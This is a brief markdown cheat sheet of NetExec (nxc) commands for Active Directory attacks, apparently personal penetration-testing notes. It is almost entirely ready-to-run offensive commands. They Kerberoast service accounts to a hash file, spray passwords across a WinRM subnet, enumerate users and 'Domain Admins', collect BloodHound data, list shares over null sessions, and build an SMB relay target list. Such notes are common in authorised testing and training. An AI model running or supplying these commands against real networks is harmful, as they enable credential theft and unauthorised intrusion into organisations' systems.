## NXC - with credentials
<span style=color:red>Above command for SMB & LDAP, can use other protocols too</span>
- Kerberoasting - [Docs](https://www.netexec.wiki/ldap-protocol/kerberoasting)
```
nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
```
- ASREPRoast - [Docs](https://www.netexec.wiki/ldap-protocol/asreproast)
- Password spraying
```
nxc winrm 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```
- Users
```
nxc ldap $ip -u $user -p $password --users
```
- Groups
```
nxc ldap <ip> -u <username> -p <password> --groups
```

```
nxc ldap <ip> -u <username> -p <password> --groups "Domain Admins"
```
- bloodhound
```
nxc ldap <ip> -u user -p pass --bloodhound --collection All
```

## Anonymous
- Map hosts
```
nxc smb 192.168.x.0/24
```
- List shares
```
nxc smb 10.10.10.178 -u 'a' -p '' 
nxc smb 10.10.10.178 -u 'a' -p '' --shares
```
- Enum hosts that SMB signing not required 
```
nxc smb 192.168.1.0/24 --gen-relay-list relay_list.txt
```
There are more useful commands for recon [check this](https://www.netexec.wiki/)
